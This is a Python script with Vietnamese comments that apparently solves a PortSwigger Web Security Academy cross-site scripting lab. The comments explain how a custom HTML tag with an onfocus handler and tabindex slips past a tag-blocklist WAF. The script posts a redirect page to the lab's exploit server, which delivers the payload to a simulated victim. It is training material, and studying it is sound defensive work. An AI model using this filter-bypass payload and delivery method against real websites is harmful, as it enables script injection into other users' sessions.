# Bài lab này cũng sử dụng cơ chế chặn các tag giống ở lab11
# Tuy nhiên lần này, lab đã chặn toàn bộ các tag thông thường
# Tôi đã thử tạo 1 tag khác 
# Vì WAF chỉ chặn danh sách các thẻ có thật, một thẻ lạ hoắc sẽ dễ dàng lọt lưới!
# payload "<hacker id=x onfocus=alert(document.domain) tabindex=1>"
# Bắt buộc phải có thuộc tính tabindex để biến một thẻ tùy chỉnh thành một phần tử có thể nhận tiêu điểm
# Sau khi chèn payload qua phương thức search , chỉ cần thêm 1 đoạn "#x" là đoạn mã độc ngay lập tức được thực thi
# Kich bản tấn công là ta sẽ gửi cho victim 1 web có lời gọi đến Url chứa mã độc và thêm #x vào sau để mã độc được chạy ngay lập tức khi người dùng click vào
# payload:
# <script>
# location='YOUR_URL'+'/?search=<hacker id=x onfocus=alert(document.domain) tabindex=1>'+'#x'
# </script>

import requests

burp0_url = "https://exploit-YOUR_EXPLOIT_HOST.exploit-server.net:443/"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
    "Accept-Language": "en-US,en;q=0.5", 
    "Accept-Encoding": "gzip, deflate, br", 
    "Content-Type": "application/x-www-form-urlencoded", 
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}
burp0_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": "<script>\r\nlocation=\"https://YOUR-URL.web-security-academy.net/?search=%3Chacker+id%3Dx+onfocus%3Dalert(document.domain)+tabindex%3D1%3E#x\"\r\n</script>", "formAction": "DELIVER_TO_VICTIM"}
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)